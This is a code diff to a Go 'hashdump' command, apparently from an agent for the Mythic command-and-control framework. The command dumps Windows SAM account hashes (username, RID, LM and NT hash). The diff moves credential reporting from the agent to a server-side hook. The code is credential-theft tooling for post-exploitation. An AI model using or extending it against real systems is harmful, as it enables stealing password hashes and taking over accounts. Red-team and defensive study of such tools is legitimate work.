@@ -127,37 +127,25 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("No user accounts found in SAM database.")
 	}
 
-	// Format output and build credential entries for Mythic's credential vault
+	// Format output — credentials are registered via ProcessResponse hook on the server side
 	hostname, _ := os.Hostname()
 	diagLog(fmt.Sprintf("hostname: %s", hostname))
 	var sb strings.Builder
-	var creds []structs.MythicCredential
 	for _, u := range users {
 		sb.WriteString(fmt.Sprintf("%s:%d:%s:%s:::\n", u.username, u.rid, u.lmHash, u.ntHash))
-
-		// Report NTLM hash to Mythic credential vault
-		if u.ntHash != emptyNTHash {
-			creds = append(creds, structs.MythicCredential{
-				CredentialType: "hash",
-				Realm:          hostname,
-				Account:        u.username,
-				Credential:     fmt.Sprintf("%s:%d:%s:%s:::", u.username, u.rid, u.lmHash, u.ntHash),
-				Comment:        "hashdump (SAM)",
-			})
-		}
 	}
-	diagLog(fmt.Sprintf("formatted: %d users, %d creds, output_len=%d", len(users), len(creds), sb.Len()))
+	diagLog(fmt.Sprintf("formatted: %d users, output_len=%d", len(users), sb.Len()))
+	diagLog("returning result")
 
-	result := structs.CommandResult{
+	// Note: Credentials are NOT sent in the agent response — Mythic's post_response
+	// protocol doesn't support inline credentials. Instead, the ProcessResponse hook
+	// in hashdump.go (agentfunctions) parses the output and registers credentials
+	// via SendMythicRPCCredentialCreate.
+	return structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
-	if len(creds) > 0 {
-		result.Credentials = &creds
-	}
-	diagLog("returning result")
-	return result
 }
 
 // regOpenKey opens a registry key using the Go stdlib windows.RegOpenKeyEx.
